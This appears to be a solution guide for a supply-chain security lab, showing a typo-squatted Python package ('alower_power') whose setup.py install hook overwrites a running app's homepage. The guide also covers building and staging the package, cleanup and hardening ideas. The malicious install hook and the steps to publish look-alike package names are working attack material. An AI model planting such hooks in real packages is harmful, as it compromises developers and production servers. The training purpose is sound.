### Solution Guide — ex3: Typo-squatting to modify a live server file

#### Overview
The developer works directly in a production-like environment. When they mistype `flower_power` (f → a/b/c/d/e), they may install a typo-squatted package from the local PyPI. Our malicious package (`alower_power`) runs code during installation that overwrites the running app’s homepage template, clearly demonstrating impact.

#### What the attack does
- Package name: `alower_power` (typo of `flower_power`).
- On install, a custom `install` hook writes to `/app/templates/index.html`, first saving a backup at `/app/templates/index.html.bak`.
- Because the web container serves files from `/app`, the change appears immediately in the UI.

The core of the malicious logic lives in `solution/malicious-packages/alower_power/setup.py`:

```1:60:w2d3/exercises/ex3/solution/malicious-packages/alower_power/setup.py
from setuptools import setup
from setuptools.command.install import install
import os

class MaliciousInstall(install):
    def run(self):
        try:
            target_file = "/app/templates/index.html"
            backup_file = target_file + ".bak"
            HACKED_HTML = """<!DOCTYPE html>... (defaced page HTML) ..."""
            if os.path.exists(target_file) and not os.path.exists(backup_file):
                with open(target_file, "rb") as fsrc:
                    data = fsrc.read()
                with open(backup_file, "wb") as fdst:
                    fdst.write(data)
            os.makedirs(os.path.dirname(target_file), exist_ok=True)
            with open(target_file, "w", encoding="utf-8") as f:
                f.write(HACKED_HTML)
        except Exception:
            pass
        super().run()
```

#### Build the malicious package

```sh
cd w2d3/exercises/ex3/solution/malicious-packages/alower_power
python3 setup.py sdist
```

This creates `dist/alower_power-<version>.tar.gz`.

Optionally, duplicate this directory and rename for other nearby typos (`blower_power`, `clower_power`, `dlower_power`, `elower_power`) and rebuild each.

#### Stage it on the local PyPI
The exercise’s PyPI server serves whatever is in `exercise/packages/`.

```sh
cd w2d3/exercises/ex3
mkdir -p exercise/packages
cp solution/malicious-packages/alower_power/dist/*.tar.gz exercise/packages/
```

Note: Using `twine` is unnecessary; simply copying tarballs into `exercise/packages/` is enough because the container mounts that directory.

#### Run the environment

```sh
cd exercise
docker-compose up --build
```

Containers:
- `web`: Flask app (mounts `src/` to `/app`).
- `pypi-server`: serves `./packages` on `http://pypi-server:8080/simple`.
- `developer-simulator`: runs repeated installs with the f→a/b/c/d/e typo pattern.

#### What you should see
- Developer logs showing random c
ommands like `pip install alower_power ...`.
- When the typo hits `a`, install succeeds and the home page is defaced.
- Visit `http://localhost:5000`. The page shows the hacked banner.
- `GET /status` (or the “Refresh Status” button) lists any installed typo packages under “Typo-Squatting Packages Detected”.

#### Restore / cleanup
```sh
cp exercise/src/templates/index.html.bak exercise/src/templates/index.html
rm exercise/packages/alower_power-*.tar.gz
docker-compose down -v
```

#### Why this works
- The developer works “in production”: installing packages affects the live filesystem mounted by the web server.
- A typo-squatted package name avoids strict version pinning on `flower_power`.
- The `install` hook is a powerful execution point that runs with the privileges of the installer.

#### Hardening ideas
- Enforce allow-lists for package names and repositories.
- Use lockfiles/constraints and CI-only builds (no dev in prod).
- Disable arbitrary build/install scripts (PEP 517 isolated builds, `--only-binary=:all:` when possible).
- Use content trust/signing and SLSA provenance.


